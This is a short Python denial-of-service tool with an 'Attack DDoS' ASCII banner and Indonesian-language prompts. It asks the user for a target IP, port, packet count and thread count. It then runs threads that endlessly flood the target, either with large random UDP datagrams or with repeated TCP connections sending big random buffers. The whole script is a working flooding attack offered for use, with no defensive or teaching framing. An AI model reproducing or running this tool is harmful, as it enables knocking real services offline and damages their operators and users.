#Autor By Cyber
import random
import socket
import threading
import os

os.system("clear")
print("          _______ _______       _____ _  __   ")
print("       /\|__   __|__   __|/\   / ____| |/ /   ")                 
print("      /  \  | |     | |  /  \ | |    | ' /    ")                
print("     / /\ \ | |     | | / /\ \| |    |  <     ")                   
print("    / ____ \| |     | |/ ____ \ |____| . \    ")                 
print("   /_/   _\_\_| ____|_/_/___ \_\_____|_|\_\   ")              
print("         |  __ \|  __ \ / __ \ / ____|        ")                   
print("         | |  | | |  | | |  | | (___          ")                    
print("         | |  | | |  | | |  | |\___ \         ")                   
print("         | |__| | |__| | |__| |____) |        ")                    
print("         |_____/|_____/ \____/|_____/         ")


ip = str(input(" Ip Target : "))
port = int(input(" Port Target : "))
choice = str(input(" Gas Ddos Gak Maniszz? (y/n) : "))
times = int(input(" Mau Berapa Packets? : "))
threads = int(input(" Isi Packets Threads? : "))
def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Misi Packets Dari ZieLxxx!!!")
		except:
			print("[!] ZieLxxx!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Misi Packets Dari ZieLxxx!!!")
		except:
			s.close()
			print("[X] ZieLxxx")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()